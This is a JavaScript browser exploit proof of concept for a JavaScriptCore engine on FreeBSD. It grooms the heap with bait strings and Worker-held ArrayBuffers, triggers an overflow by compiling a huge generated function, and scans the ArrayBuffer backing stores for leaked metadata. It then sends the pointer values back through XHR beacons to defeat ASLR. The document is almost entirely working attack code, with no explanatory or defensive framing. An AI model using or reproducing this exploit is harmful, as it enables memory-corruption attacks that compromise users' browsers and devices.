// p157 — ArrayBuffer byte extraction via bait-and-switch
//
// p156 CONFIRMED: bait-and-switch corrupts ALL 14 Worker strings (.length=81400).
// PROBLEM: charCodeAt reads through corrupted m_data8 → only 0x41 (original data).
// FIX: ArrayBuffer BACKING STORES are also in marge heap (Gigacage disabled on FreeBSD).
//      Uint8Array cell in MarkedSpace keeps uncorrupted m_vector → direct byte read.
//      ABs zero-initialized (fastCalloc) → any non-zero byte = metadata entry data.
//
// STRATEGY:
// 1. Main thread: 20 bait strings (100KB, marge, low addresses)
// 2. Worker: 6 sentinel strings (detection trigger) + 14 ABs (byte extraction)
// 3. Free baits + 30 rounds GC pressure
// 4. Compile + call → entries overwrite StringImpl headers AND AB backing stores
// 5. Worker busy-loops on string .length → triggers extraction
// 6. Read raw bytes from AB backing stores → extract metadata entries
// 7. Beacon: 8-byte pointer values at key offsets → ASLR leak
//
// Beacon prefix: V157-

(function() {
  var BASE = location.protocol + '//' + location.host;
  function B(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', BASE + '/beacon/V157-' + tag + '?t=' + Date.now(), true);
      x.send();
    } catch(e) {}
  }

  B('BOOT');

  // ── WORKER ──
  var workerCode = function() {
    var strs = [];
    var abViews = [];
    var baseUrl = '';
    var STR_LEN = 100000;
    var AB_SIZE = 100096;

    function beacon(tag) {
      try {
        var x = new XMLHttpRequest();
        x.open('GET', baseUrl + '/beacon/V157-W-' + tag + '?t=' + Date.now(), true);
        x.send();
      } catch(e) {}
    }
    function hx(v) { return (v < 16 ? '0' : '') + v.toString(16); }

    self.onmessage = function(e) {
      if (e.data.cmd === 'init') {
        baseUrl = e.data.baseUrl;
        beacon('ALIVE');
        return;
      }
      if (e.data.cmd === 'alloc') {
        var chunk = '';
        for (var k = 0; k < 100; k++) chunk += 'AAAAAAAAAA';

        for (var i = 0; i < 6; i++) {
          var s = '';
          for (var j = 0; j < STR_LEN; j += 1000) s += chunk;
          s = s.substring(0, STR_LEN);
          s.charCodeAt(0);
          strs.push(s);
        }

        for (var i = 0; i < 14; i++) {
          var ab = new ArrayBuffer(AB_SIZE);
          abViews.push(new Uint8Array(ab));
        }

        beacon('READY-S' + strs.length + '-A' + abViews.length);
        self.postMessage({ ready: true });
        return;
      }
      if (e.data.cmd === 'watch') {
        beacon('WATCHING');

        var found = false;
        var iters = 0;
        while (!found) {
          for (var i = 0; i < strs.length; i++) {
            if (strs[i].length !== STR_LEN) {
              beacon('TRIG-S' + i + '-len=' + strs[i].length);
              found = true;
              break;
            }
          }
          if (!found && abViews[0][0] !== 0) {
            beacon('TRIG-AB0-v=' + abViews[0][0]);
            found = true;
          }
          iters++;
          if (iters % 500000 === 0) beacon('POLL-' + iters);
        }

        // ── EXTRACTION: scan ABs for metadata entry bytes ──
        var abHits = 0;
        for (var i = 0; i < abViews.length; i++) {
          var view = abViews[i];
          var first = -1;
          for (var j = 0; j < Math.min(4000, view.length); j++) {
            if (view[j] !== 0) { first = j; break; }
          }
          if (first < 0) continue;

          abHits++;
          beacon('AB' + i + '-HIT-' + first);

          // Dump entry 1 (112 bytes) in two 56-byte halves
          var h1 = '';
          for (var b = first; b < first + 56 && b < view.length; b++) h1 += hx(view[b]);
          beacon('D' + i + 'a-' + h1);
          var h2 = '';
          for (var b = first + 56; b < first + 112 && b < view.length; b++) h2 += hx(view[b]);
          beacon('D' + i + 'b-' + h2);

          // Extract 8-byte values at every 8-byte offset (little-endian display)
          var ptrs = '';
          for (var p = 0; p < 112; p += 8) {
            var off = first + p;
            if (off + 8 > view.length) break;
            var nz = false;
            for (var v2 = 0; v2 < 8; v2++) { if (view[off + v2] !== 0) { nz = true; break; } }
            if (nz) {
              var h8 = '';
              for (var hh = 7; hh >= 0; hh--) h8 += hx(view[off + hh]);
              ptrs += p + ':' + h8 + ' ';
            }
          }
          if (ptrs) beacon('P' + i + '-' + ptrs.substring(0, 200));

          // Dump entry 2 (next 112 bytes) for comparison
          var s2 = first + 112;
          if (s2 + 112 <= view.length) {
            var g1 = '';
            for (var b = s2; b < s2 + 56; b++) g1 += hx(view[b]);
            beacon('D' + i + 'c-' + g1);
            var g2 = '';
            for (var b = s2 + 56; b < s2 + 112; b++) g2 += hx(view[b]);
            beacon('D' + i + 'd-' + g2);

            // 8-byte values from entry 2
            var ptrs2 = '';
            for (var p = 0; p < 112; p += 8) {
              var off = s2 + p;
              if (off + 8 > view.length) break;
              var nz = false;
              for (var v2 = 0; v2 < 8; v2++) { if (view[off + v2] !== 0) { nz = true; break; } }
              if (nz) {
                var h8 = '';
                for (var hh = 7; hh >= 0; hh--) h8 += hx(view[off + hh]);
                ptrs2 += p + ':' + h8 + ' ';
              }
            }
            if (ptrs2) beacon('Q' + i + '-' + ptrs2.substring(0, 200));
          }

          if (abHits >= 4) break;
        }

        // String corruption summary
        for (var i = 0; i < strs.length; i++) {
          if (strs[i].length !== STR_LEN) beacon('SH' + i + '-' + strs[i].length);
        }

        beacon('DONE-ab=' + abHits);
      }
    };
  };

  var workerBlob = new Blob(
    ['(' + workerCode.toString() + ')()'],
    { type: 'application/javascript' }
  );
  var worker = new Worker(URL.createObjectURL(workerBlob));
  worker.postMessage({ cmd: 'init', baseUrl: BASE });

  // ── PHASE 1: BAIT STRINGS (marge, low addresses) ──
  var N_BAIT = 20;
  var STR_LEN = 100000;

  B('BAIT-START');
  var baits = [];
  var baitChunk = '';
  for (var k = 0; k < 100; k++) baitChunk += 'BBBBBBBBBB';
  for (var i = 0; i < N_BAIT; i++) {
    var bait = '';
    for (var j = 0; j < STR_LEN; j += 1000) bait += baitChunk;
    bait = bait.substring(0, STR_LEN);
    bait.charCodeAt(0);
    baits.push(bait);
  }
  baitChunk = null;
  B('BAIT-DONE-' + N_BAIT);

  // ── PHASE 2: WORKER ALLOCATES TARGETS ──
  worker.onmessage = function(e) {
    if (e.data.ready) phaseFreeBaits();
  };
  B('WORKER-ALLOC');
  worker.postMessage({ cmd: 'alloc' });

  // ── PHASE 3: FREE BAITS + GC PRESSURE ──
  function phaseFreeBaits() {
    B('FREE-START');
    for (var i = 0; i < baits.length; i++) baits[i] = null;
    baits = null;

    var gcRound = 0;
    function gcPressureRound() {
      for (var j = 0; j < 1000; j++) new ArrayBuffer(8192);
      for (var j = 0; j < 500; j++) new Array(100).fill(gcRound);
      gcRound++;
      if (gcRound < 30) setTimeout(gcPressureRound, 30);
      else { B('GC-DONE-' + gcRound); phaseBuild(); }
    }
    gcPressureRound();
  }

  // ── PHASE 4: BUILD OVERFLOW ──
  function phaseBuild() {
    B('BUILD-START');

    var N = 38348816;
    var CHUNK = 4000000;
    var CHUNKS = Math.floor(N / CHUNK);
    var REM = N - CHUNKS * CHUNK;

    var callChunk = '';
    for (var c = 0; c < CHUNK; c++) callChunk += 'a();';
    var remChunk = '';
    for (var r = 0; r < REM; r++) remChunk += 'a();';

    var parts = ['window.__v157fn=function(a){'];
    for (var ch = 0; ch < CHUNKS; ch++) parts.push(callChunk);
    parts.push(remChunk);
    parts.push('};window.__v157ok=true;');

    var blob = new Blob(parts, { type: 'application/javascript' });
    B('BLOB-' + (blob.size / 1024 / 1024).toFixed(0) + 'MB');
    callChunk = null;
    remChunk = null;
    parts = null;

    var url = URL.createObjectURL(blob);
    var sc = document.createElement('script');

    sc.onload = function() {
      B('COMPILED-' + (window.__v157ok ? 'OK' : 'FAIL'));
      if (!window.__v157fn) { B('NO-FN'); return; }

      // Start Worker polling, then trigger overflow
      worker.postMessage({ cmd: 'watch' });

      setTimeout(function() {
        B('CALLING');
        try {
          window.__v157fn(function(){});
        } catch(ex) {
          B('CATCH-' + (ex.message || '').substring(0, 30));
        }
        B('SURVIVED');
      }, 200);
    };

    sc.onerror = function() { B('SCRIPT-ERR'); };
    document.head.appendChild(sc);
    sc.src = url;
  }
})();
